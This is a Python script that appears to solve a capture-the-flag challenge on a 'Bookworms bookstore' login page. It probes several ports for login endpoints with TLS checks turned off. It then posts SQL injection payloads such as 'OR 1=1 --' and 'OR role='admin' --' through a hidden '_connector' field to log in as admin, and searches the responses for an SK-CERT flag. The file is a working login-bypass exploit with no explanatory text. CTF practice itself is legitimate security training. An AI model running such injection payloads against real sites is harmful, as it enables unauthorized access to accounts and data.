import random
import re
import socket
import string
from urllib.parse import urlparse

import requests


HOST = "exp.cybergame.sk"
HTTP_PORT_CANDIDATES = [7002, 7006, 7005, 7004, 7007, 7008, 7000, 80, 443]
FLAG_RE = re.compile(r"SK-CERT\{[^}]+\}")


def randstr(n):
    alphabet = string.ascii_letters + string.digits
    return "".join(random.choice(alphabet) for _ in range(n))


def raw_http_probe(host, port, path="/login"):
    try:
        with socket.create_connection((host, port), timeout=3) as s:
            req = f"GET {path} HTTP/1.0\r\nHost: {host}\r\nConnection: close\r\n\r\n"
            s.sendall(req.encode())
            data = s.recv(2048)
            return data.decode(errors="replace")
    except Exception as e:
        return f"ERROR: {e}"


def discover_login_urls():
    urls = [f"http://{HOST}:7002/login"]
    for port in HTTP_PORT_CANDIDATES:
        for scheme in ("http", "https"):
            if scheme == "https" and port not in (443, 7002):
                continue
            if scheme == "http" and port == 443:
                continue
            base = f"{scheme}://{HOST}"
            if port not in (80, 443):
                base = f"{base}:{port}"
            url = f"{base}/login"
            try:
                r = requests.get(url, timeout=4, verify=False)
                title_hit = "Bookworms bookstore" in r.text or "Welcome, please login" in r.text
                print(f"[probe] {url:<38} -> {r.status_code} len={len(r.text)} bookworms={title_hit}")
                if r.status_code in (200, 302, 405):
                    urls.append(url)
            except requests.RequestException as e:
                print(f"[probe] {url:<38} -> {type(e).__name__}: {e}")
                if scheme == "http":
                    raw = raw_http_probe(HOST, port, "/login")
                    snippet = raw.replace("\r", "\\r").replace("\n", "\\n")[:140]
                    print(f"[raw]   {HOST}:{port:<5} -> {snippet}")
    # de-dup while preserving order
    seen = set()
    out = []
    for u in urls:
        if u not in seen:
            seen.add(u)
            out.append(u)
    return out


def try_payloads(url):
    payloads = [
        {
            "username": randstr(12),
            "password": randstr(20),
            "role": "admin",
            "_connector": "OR",
        },
        {
            "username": randstr(12),
            "password": randstr(20),
            "role": "admin",
            "_connector": "OR 1=1 --",
        },
        {
            "username": randstr(12),
            "password": randstr(20),
            "role": "admin",
            "_connector": "OR role='admin' --",
        },
        {
            "username": randstr(12),
            "password": randstr(20),
            "role": "admin",
            "_connector": "XOR",
        },
    ]
    for i, data in enumerate(payloads, 1):
        try:
            r = requests.post(url, data=data, timeout=6, verify=False)
        except requests.RequestException as e:
            print(f"[post]  {url} payload#{i} -> {type(e).__name__}: {e}")
            continue
        flag = FLAG_RE.search(r.text)
        preview = r.text.replace("\n", " ")[:180]
        print(f"[post]  {url} payload#{i} -> status={r.status_code} len={len(r.text)}")
        if "Query error" in r.text:
            qe = re.sub(r".*?(Query error[^<]*)<.*", r"\\1", r.text, flags=re.S)
            print(f"        {qe[:180]}")
        else:
            print(f"        {preview}")
        if flag:
            print(f"[FLAG] {flag.group(0)}")
            return flag.group(0)
    return None


def main():
    requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]
    urls = discover_login_urls()
    print("\n[+] Candidate login endpoints:")
    for u in urls:
        print(f"    {u}")

    for url in urls:
        flag = try_payloads(url)
        if flag:
            return
    print("\n[-] No flag found from reachable endpoints.")


if __name__ == "__main__":
    main()
